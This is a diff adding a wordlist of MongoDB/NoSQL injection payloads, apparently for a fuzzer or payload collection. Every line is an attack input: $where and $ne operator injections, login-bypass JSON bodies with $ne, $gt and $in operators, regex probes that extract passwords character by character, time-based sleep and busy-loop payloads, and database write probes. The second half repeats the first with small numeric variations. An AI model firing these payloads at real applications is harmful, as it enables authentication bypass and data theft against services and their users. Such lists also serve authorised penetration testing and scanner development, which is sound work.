@@ -1,0 +1,50 @@
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1'
+1, $where: '1 == 1'
+{ $ne: 1 }
+', $or: [ {}, { 'a':'a
+' } ], $comment:'successful MongoDB injection'
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+|| 1==1
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+{$gt: ''}
+[$ne]=1
+';sleep(5000);
+';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
+{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
+{"username": {"$gt":""}, "password": {"$gt":""}}
+username[$ne]=toto&password[$regex]=.{1}
+username[$ne]=toto&password[$regex]=.{3}
+{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
+true, $where: '2 == 2'
+, $where: '2 == 2'
+$where: '2 == 2'
+', $where: '2 == 2'
+2, $where: '2 == 2'
+{ $ne: 2 }
+', $or: [ {}, { 'a':'a
+' } ], $comment:'successful MongoDB injection'
+db.injection.insert({success:2});
+db.injection.insert({success:2});return 1;db.stores.mapReduce(function() { { emit(1,1
+|| 2==2
+{$lt: ''}
+[$ne]=1
+';sleep(2000);
+';it=new%20Date();do{pt=new%20Date();}while(pt-it<3000);
+{"username": {"$ne": "foo"}, "password": {"$ne": null}}
+{"username": {"$ne": "foo"}, "password": {"$ne": null}}
+{"username": {"$gt": "foo"}, "password": {"$gt": undefined}}
+{"username": {"$ne":""}, "password": {"$ne":""}}
+username[$ne]=toto&password[$regex]=.{2}
+username[$lt]=toto&password[$regex]=.{4}
+{"username":{"$in":["root"]},"password":{"$gt":""}}
+' } ], $comment:'hacked'
+{$ne: ''}
